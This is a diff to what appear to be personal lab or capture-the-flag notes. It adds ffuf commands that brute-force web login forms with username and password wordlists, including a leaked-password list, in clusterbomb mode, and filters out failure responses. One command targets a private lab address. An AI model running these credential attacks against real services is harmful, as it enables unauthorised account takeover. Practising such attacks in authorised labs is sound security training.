@@ -6,3 +6,18 @@ ffuf -c -request request.req -request-proto http -w {WORDLIST} /probable-v2-top 
 ffuf -c -request request.req -request-proto http -w https://github.com/danielmiessler/SecLists/blob/master/Passwords/probable-v2-top1575.txt -fr "Wrong Credentials"
 
 
+
+
+
+
+
+
+in request
+{"username":"USERFUZZ","password":"PASSFUZZ"}
+
+ffuf -request request.txt -request-proto http -mode clusterbomb -w /path/to/users/file.txt:USERFUZZ -w /path/to/password/file.txt:PASSFUZZ -mc 200
+ffuf -c -request login_request.req -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USERFUZZ -w /usr/share/seclists/Passwords/darkweb2017-top100.txt:PASSFUZZ -fr "Invalid username or"
+
+
+
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.141.56/customers/login -fc 200
